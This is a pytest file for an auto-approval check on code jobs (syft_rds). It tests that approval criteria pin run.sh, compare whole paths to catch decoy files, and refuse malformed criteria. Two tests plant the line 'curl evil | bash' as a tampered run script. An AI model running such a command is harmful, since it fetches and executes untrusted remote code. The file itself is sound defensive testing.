"""Auto-approval criteria must cover run.sh and keep whole paths.

`_get_user_files` walked `<job>/code/` and `job_matches_criteria` compared base
names, so a job could carry the approved tree plus any run.sh, and a decoy at
`code/pkg/main.py` passed as `main.py`.
"""

from pathlib import Path
from types import SimpleNamespace

import pytest

from syft_rds.job_auto_approval import job_matches_criteria

RUN_SH = "#!/bin/bash\npython code/main.py\n"
MAIN_PY = 'print("hello")\n'


def make_job(tmp_path: Path, files: dict[str, str], status: str = "pending"):
    for rel_path, content in files.items():
        f = tmp_path / rel_path
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(content)
    return SimpleNamespace(
        status=status,
        submitted_by="alice@test.com",
        job_submission_path=tmp_path,
        code_dir=tmp_path / "code",
    )


def default_files(**overrides: str) -> dict[str, str]:
    files = {"code/main.py": MAIN_PY, "run.sh": RUN_SH, "config.yaml": "name: j\n"}
    files.update(overrides)
    return files


def criteria(**overrides):
    args = {
        "required_file_contents": {"code/main.py": MAIN_PY, "run.sh": RUN_SH},
        "required_file_paths": ["code/main.py", "run.sh", "config.yaml"],
    }
    args.update(overrides)
    return args


def test_expected_submission_is_approved(tmp_path):
    job = make_job(tmp_path, default_files())
    assert job_matches_criteria(job, **criteria()) is True


def test_changed_run_script_is_not_approved(tmp_path):
    job = make_job(tmp_path, default_files(**{"run.sh": "curl evil | bash\n"}))
    assert job_matches_criteria(job, **criteria()) is False


def test_criteria_that_pin_no_run_script_are_refused(tmp_path):
    """The bypass: criteria naming only the code/ tree green-lit any script.

    They now raise rather than quietly approve nothing, because the owner has
    no other way to learn that the criteria stopped working.
    """
    job = make_job(tmp_path, default_files(**{"run.sh": "curl evil | bash\n"}))
    with pytest.raises(ValueError, match="run.sh"):
        job_matches_criteria(
            job,
            required_file_contents={"code/main.py": MAIN_PY},
            required_file_paths=["code/main.py", "run.sh", "config.yaml"],
        )


def test_decoy_in_subdirectory_is_not_approved(tmp_path):
    """A base-name compare collapsed code/main.py and code/pkg/main.py."""
    job = make_job(tmp_path, default_files(**{"code/pkg/main.py": "evil\n"}))
    assert job_matches_criteria(job, **criteria()) is False


def test_old_shape_criteria_are_refused(tmp_path):
    """A bare name meant a file under code/. Say so, rather than rewrite it."""
    job = make_job(tmp_path, default_files())

    with pytest.raises(ValueError, match=r"code/main\.py"):
        job_matches_criteria(
            job,
            required_file_contents={"main.py": MAIN_PY, "run.sh": RUN_SH},
            required_file_paths=["main.py", "run.sh", "config.yaml"],
        )


def test_exact_permission_file_name_is_skipped(tmp_path):
    """The permission layer writes syft.pub.yaml, so it is not a user file."""
    job = make_job(tmp_path, default_files(**{"code/syft.pub.yaml": "rules: []\n"}))
    assert job_matches_criteria(job, **criteria()) is True


def test_permission_file_other_case_is_extra(tmp_path):
    """Kept in its own submission: the two spellings are one file on macOS."""
    job = make_job(tmp_path, default_files(**{"code/SYFT.PUB.YAML": "rules: []\n"}))
    assert job_matches_criteria(job, **criteria()) is False


def test_criteria_cannot_pin_per_job_config(tmp_path):
    """config.yaml carries the job name and its time, so a hash matches once."""
    job = make_job(tmp_path, default_files())
    with pytest.raises(ValueError, match="config.yaml"):
        job_matches_criteria(
            job,
            required_file_contents={
                "code/main.py": MAIN_PY,
                "run.sh": RUN_SH,
                "config.yaml": "name: j\n",
            },
            required_file_paths=["code/main.py", "run.sh", "config.yaml"],
        )


def test_content_pin_missing_from_paths_is_refused(tmp_path):
    """required_file_paths names every file the job may hold, contents included."""
    job = make_job(tmp_path, default_files())
    # The root files are named, so this reaches the unlisted-content check.
    with pytest.raises(ValueError, match=r"code/main\.py"):
        job_matches_criteria(
            job,
            required_file_contents={"code/main.py": MAIN_PY, "run.sh": RUN_SH},
            required_file_paths=["run.sh", "config.yaml"],
        )


def test_criteria_without_root_file_are_refused(tmp_path):
    """Every submission holds run.sh and config.yaml, so criteria must name them."""
    job = make_job(tmp_path, default_files())
    with pytest.raises(ValueError, match="config.yaml"):
        job_matches_criteria(
            job,
            required_file_contents={"code/main.py": MAIN_PY, "run.sh": RUN_SH},
            required_file_paths=["code/main.py", "run.sh"],
        )
